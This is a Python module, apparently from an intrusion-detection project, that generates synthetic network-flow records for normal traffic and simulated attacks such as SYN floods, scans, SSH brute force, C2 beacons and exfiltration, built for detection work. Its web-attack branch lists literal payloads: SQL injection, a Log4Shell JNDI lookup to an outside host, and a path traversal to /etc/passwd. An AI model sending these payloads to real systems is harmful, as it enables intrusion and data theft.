"""
Network Traffic and Attack Simulation Engine.
Generates realistic multi-protocol benign traffic and targeted cyber attack streams.
"""
import random
import time
import uuid
from typing import List, Generator
from datetime import datetime
from backend.app.models.schemas import NetworkFlow, ProtocolType


# Realistic IP pools
INTERNAL_HOSTS = ["192.168.1.100", "192.168.1.105", "192.168.1.112", "192.168.1.120", "192.168.1.150"]
EXTERNAL_BENIGN_SERVERS = ["142.250.190.46", "151.101.65.140", "104.244.42.1", "13.107.42.16"]
MALICIOUS_IP_POOL = ["185.220.101.5", "45.142.195.12", "194.26.29.114", "103.145.13.88", "198.51.100.23"]

COMMON_PORTS = [80, 443, 8080, 53, 22, 21, 3389, 445, 3306, 5432]


class TrafficSimulator:
    @staticmethod
    def generate_flow(attack_type: str = "normal", target_ip: str = "192.168.1.100") -> NetworkFlow:
        """
        Generates a single synthetic NetworkFlow matching the requested profile.
        """
        now = datetime.utcnow()
        flow_id = str(uuid.uuid4())[:8]

        if attack_type == "ddos_syn":
            src_ip = f"194.26.{random.randint(10, 50)}.{random.randint(1, 254)}"
            src_port = random.randint(1024, 65535)
            return NetworkFlow(
                flow_id=f"flow-ddos-{flow_id}",
                timestamp=now,
                src_ip=src_ip,
                src_port=src_port,
                dst_ip=target_ip,
                dst_port=80,
                protocol=ProtocolType.TCP,
                service="http",
                duration=round(random.uniform(0.01, 0.05), 3),
                src_bytes=random.randint(40, 120),
                dst_bytes=0,
                src_packets=random.randint(250, 800),
                dst_packets=0,
                flag="S0",
                serror_rate=round(random.uniform(0.85, 1.0), 2),
                rerror_rate=0.0,
                same_srv_rate=1.0,
                diff_srv_rate=0.0,
                dst_host_count=100,
                dst_host_srv_count=100,
                dst_host_same_srv_rate=1.0,
                payload_preview="TCP SYN Flood Packet Stream (No ACK)"
            )

        elif attack_type == "port_scan_nmap":
            src_ip = "103.145.13.88"
            scanned_port = random.choice(COMMON_PORTS)
            return NetworkFlow(
                flow_id=f"flow-scan-{flow_id}",
                timestamp=now,
                src_ip=src_ip,
                src_port=random.randint(30000, 60000),
                dst_ip=target_ip,
                dst_port=scanned_port,
                protocol=ProtocolType.TCP,
                service=f"port_{scanned_port}",
                duration=round(random.uniform(0.02, 0.1), 3),
                src_bytes=random.randint(44, 60),
                dst_bytes=random.randint(0, 40),
                src_packets=random.randint(1, 3),
                dst_packets=random.randint(0, 1),
                flag="REJ" if random.random() > 0.4 else "SF",
                serror_rate=0.1,
                rerror_rate=round(random.uniform(0.6, 0.9), 2),
                same_srv_rate=round(random.uniform(0.05, 0.2), 2),
                diff_srv_rate=round(random.uniform(0.8, 0.98), 2),
                dst_host_count=random.randint(70, 95),
                dst_host_srv_count=random.randint(2, 5),
                dst_host_same_srv_rate=0.08,
                payload_preview="Nmap Scripting Engine Probe / Stealth SYN Scan"
            )

        elif attack_type == "ssh_brute":
            src_ip = "91.240.118.172"
            return NetworkFlow(
                flow_id=f"flow-brute-{flow_id}",
                timestamp=now,
                src_ip=src_ip,
                src_port=random.randint(40000, 65000),
                dst_ip=target_ip,
                dst_port=22,
                protocol=ProtocolType.TCP,
                service="ssh",
                duration=round(random.uniform(0.2, 0.8), 2),
                src_bytes=random.randint(120, 300),
                dst_bytes=random.randint(80, 150),
                src_packets=random.randint(12, 35),
                dst_packets=random.randint(10, 30),
                flag="RSTO",
                serror_rate=0.0,
                rerror_rate=round(random.uniform(0.75, 0.95), 2),
                same_srv_rate=1.0,
                diff_srv_rate=0.0,
                dst_host_count=1,
                dst_host_srv_count=1,
                dst_host_same_srv_rate=1.0,
                payload_preview="SSH-2.0-OpenSSH Auth Failed: user 'root' password 'admin123'"
            )

        elif attack_type == "sqli_web":
            sqli_payloads = [
                "GET /login?user=admin' OR '1'='1 HTTP/1.1\r\nHost: target\r\nUser-Agent: Mozilla/5.0",
                "POST /search HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nq=1' UNION SELECT null,username,password FROM users--",
                "GET /api/v1/products?id=1; WAITFOR DELAY '0:0:5'-- HTTP/1.1",
                "GET /app?token=${jndi:ldap://103.145.13.88:1389/Exploit} HTTP/1.1",
                "GET /admin?page=../../../../etc/passwd HTTP/1.1\r\nHost: target"
            ]
            payload = random.choice(sqli_payloads)
            src_ip = "185.220.101.5"
            return NetworkFlow(
                flow_id=f"flow-sqli-{flow_id}",
                timestamp=now,
                src_ip=src_ip,
                src_port=random.randint(32000, 60000),
                dst_ip=target_ip,
                dst_port=80,
                protocol=ProtocolType.TCP,
                service="http",
                duration=round(random.uniform(0.15, 0.6), 2),
                src_bytes=len(payload) + 120,
                dst_bytes=random.randint(450, 1800),
                src_packets=random.randint(5, 12),
                dst_packets=random.randint(4, 10),
                flag="SF",
                serror_rate=0.0,
                rerror_rate=0.0,
                same_srv_rate=0.9,
                diff_srv_rate=0.1,
                dst_host_count=5,
                dst_host_srv_count=5,
                dst_host_same_srv_rate=1.0,
                payload_preview=payload
            )

        elif attack_type == "c2_beacon":
            c2_ip = "45.142.195.12"
            victim_ip = random.choice(INTERNAL_HOSTS)
            return NetworkFlow(
                flow_id=f"flow-c2-{flow_id}",
                timestamp=now,
                src_ip=victim_ip,
                src_port=random.randint(49152, 65535),
                dst_ip=c2_ip,
                dst_port=443,
                protocol=ProtocolType.TCP,
                service="https",
                duration=round(random.uniform(1.2, 3.5), 2),
                src_bytes=random.randint(350, 800),
                dst_bytes=random.randint(200, 600),
                src_packets=random.randint(8, 16),
                dst_packets=random.randint(6, 14),
                flag="SF",
                serror_rate=0.0,
                rerror_rate=0.0,
                same_srv_rate=1.0,
                diff_srv_rate=0.0,
                dst_host_count=2,
                dst_host_srv_count=2,
                dst_host_same_srv_rate=1.0,
                payload_preview="POST /api/v2/beacon?id=49f8a HTTP/1.1\r\nUser-Agent: curl/7.68.0\r\n\r\n[Encrypted Heartbeat]"
            )

        elif attack_type == "exfiltration":
            victim_ip = "192.168.1.112"
            exfil_ip = "198.51.100.23"
            return NetworkFlow(
                flow_id=f"flow-exfil-{flow_id}",
                timestamp=now,
                src_ip=victim_ip,
                src_port=random.randint(50000, 60000),
                dst_ip=exfil_ip,
                dst_port=8443,
                protocol=ProtocolType.TCP,
                service="https",
                duration=round(random.uniform(15.0, 45.0), 2),
                src_bytes=random.randint(8_500_000, 25_000_000),  # 8.5MB to 25MB
                dst_bytes=random.randint(1200, 4000),
                src_packets=random.randint(6000, 18000),
                dst_packets=random.randint(400, 1200),
                flag="SF",
                serror_rate=0.0,
                rerror_rate=0.0,
                same_srv_rate=1.0,
                diff_srv_rate=0.0,
                dst_host_count=1,
                dst_host_srv_count=1,
                dst_host_same_srv_rate=1.0,
                payload_preview="PUT /archive_encrypted.tar.gz HTTP/1.1 [Asymmetric Heavy Egress]"
            )

        else:  # Normal Benign Traffic
            is_outbound = random.random() > 0.4
            src_ip = random.choice(INTERNAL_HOSTS) if is_outbound else random.choice(EXTERNAL_BENIGN_SERVERS)
            dst_ip = random.choice(EXTERNAL_BENIGN_SERVERS) if is_outbound else random.choice(INTERNAL_HOSTS)
            service = random.choice(["http", "https", "dns"])
            dst_port = 443 if service == "https" else (80 if service == "http" else 53)
            protocol = ProtocolType.UDP if service == "dns" else ProtocolType.TCP

            return NetworkFlow(
                flow_id=f"flow-norm-{flow_id}",
                timestamp=now,
                src_ip=src_ip,
                src_port=random.randint(1024, 65535),
                dst_ip=dst_ip,
                dst_port=dst_port,
                protocol=protocol,
                service=service,
                duration=round(random.uniform(0.08, 1.8), 3),
                src_bytes=random.randint(200, 3200),
                dst_bytes=random.randint(800, 12000),
                src_packets=random.randint(4, 18),
                dst_packets=random.randint(6, 24),
                flag="SF",
                serror_rate=round(random.uniform(0.0, 0.03), 2),
                rerror_rate=round(random.uniform(0.0, 0.02), 2),
                same_srv_rate=round(random.uniform(0.85, 1.0), 2),
                diff_srv_rate=round(random.uniform(0.0, 0.15), 2),
                dst_host_count=random.randint(3, 12),
                dst_host_srv_count=random.randint(3, 12),
                dst_host_same_srv_rate=round(random.uniform(0.8, 1.0), 2),
                payload_preview=f"GET /index.html HTTP/1.1\r\nHost: cdn.cloud.net\r\nAccept: */*" if service != "dns" else "DNS Query: api.github.com A IN"
            )

    @staticmethod
    def generate_batch(attack_type: str, count: int = 10, target_ip: str = "192.168.1.100") -> List[NetworkFlow]:
        """Generates a batch of flows for simulation injection."""
        return [TrafficSimulator.generate_flow(attack_type=attack_type, target_ip=target_ip) for _ in range(count)]
